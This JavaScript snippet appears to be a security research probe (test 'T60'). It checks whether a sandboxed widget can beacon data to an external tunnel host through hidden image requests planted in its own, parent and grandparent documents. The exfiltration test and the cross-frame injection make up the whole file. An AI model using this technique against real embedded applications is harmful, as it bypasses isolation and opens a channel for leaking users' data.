// load from ARBITRARY servers. fetch() was measured blocked in
// both realms (T43) - but img-src and connect-src are different
// CSP keys; this test fires image beacons at:
//   L0 = our own widget document (control)
//   L1 = parent document (the panel - expect CSP block)
//   L2 = parent.parent document (the runner - the prediction: GO)
// Ground truth = the receiver log (an <img> of a text response
// fires onerror even when the request ARRIVED - banner is only a
// hint, the log decides).

  var RECEIVER = "https://same-disc-constructed-brussels.trycloudflare.com";
  var d0 = document;
  var box = d0.createElement("div");
  box.id = "t60-box";
  box.style.cssText = "position:fixed;left:12px;bottom:12px;z-index:2147483647;font:12px Menlo,monospace;color:#ff5252;background:rgba(0,0,0,.85);border:1px solid #ff5252;border-radius:6px;padding:8px 10px;max-width:80vw;max-height:60vh;overflow:auto;white-space:pre-wrap;word-break:break-all";
  d0.body.appendChild(box);
  var lines = ["T60 IMG BEACON (inert), zero clicks:"];

  function beacon(doc, tag) {
    try {
      var img = doc.createElement("img");
      img.style.cssText = "position:fixed;left:-9999px;bottom:0;width:1px;height:1px";
      img.onload = function () { lines.push(tag + ": ONLOAD (request completed OK)"); box.textContent = lines.join("\n"); };
      img.onerror = function () { lines.push(tag + ": ONERROR (maybe still sent - log decides)"); box.textContent = lines.join("\n"); };
      img.src = RECEIVER + "/leak?d=" + encodeURIComponent(tag) + "&nc=" + Date.now();
      var mount = doc.body || doc.documentElement;
      mount.appendChild(img);
      lines.push(tag + ": img appended to " + (doc.body ? "body" : "documentElement"));
    } catch (e) {
      lines.push(tag + ": APPEND FAILED - " + e);
    }
    box.textContent = lines.join("\n");
  }

  function hostOf(w) {
    try { return w.location.host || "(no host)"; }
    catch (e) { return "(cross-origin blocked)"; }
  }

  // CSP violation listeners on every reachable document
  function listen(doc, tag) {
    try {
      doc.addEventListener("securitypolicyviolation", function (ev) {
        lines.push(tag + " CSP VIOLATION: " + (ev.violatedDirective || "?") + " -> " + (ev.blockedURI || "?"));
        box.textContent = lines.join("\n");
      });
    } catch (e) {}
  }

  // L0: own document (control)
  listen(d0, "L0");
  beacon(d0, "T60-L0-widget-doc");

  // L1: parent
  try {
    var P = window.parent;
    if (P && P !== window) {
      lines.push("L1 parent accessible, host: " + hostOf(P));
      listen(P.document, "L1");
      beacon(P.document, "T60-L1-parent-doc");
      // L2: parent.parent (runner)
      try {
        var R = P.parent;
        if (R && R !== P) {
          lines.push("L2 parent.parent accessible, host: " + hostOf(R));
          listen(R.document, "L2");
          beacon(R.document, "T60-L2-runner-doc");
        } else {
          lines.push("L2: parent.parent === parent (only two levels)");
        }
      } catch (e) {
        lines.push("L2: ACCESS FAILED - " + e);
      }
    } else {
      lines.push("L1: no parent (top-level?)");
    }
  } catch (e) {
    lines.push("L1: ACCESS FAILED - " + e);
  }

  lines.push("(wait a few seconds; the receiver log is ground truth)");
